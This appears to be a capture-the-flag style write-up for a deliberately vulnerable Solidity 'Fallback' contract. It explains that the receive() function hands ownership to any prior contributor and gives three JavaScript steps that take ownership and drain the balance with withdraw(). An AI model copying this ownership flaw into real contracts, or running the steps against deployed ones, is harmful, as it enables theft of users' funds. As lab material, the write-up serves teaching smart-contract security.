## contract code :
```html
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
**Vulnerability:** there are 2 state variables that were tracking ownership and funds.
The core vulnerability lies within the ```receive()``` fallback function:
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```
The problem is that once we record a contribution by sending a small amount of ETH to the contribute() function, any subsequent direct transaction to the contract address will trigger the receive() function, granting us ownership and allowing us to withdraw all funds.

## Exploit Steps
1. **Contribute a tiny amount** to get into the tracking mapping:
   ```javascript
   await contract.contribute({value: toWei("0.0001")})
   ```
2. **Trigger the `receive()` function** by sending Ether directly to the contract address, which reassigns the `owner` variable to the player:
   ```javascript
   await sendTransaction({from: player, to: contract.address, value: toWei("0.0001")})
   ```
3. **Drain the contract** using the now-accessible `withdraw()` function:
   ```javascript
   await contract.withdraw()
   ```


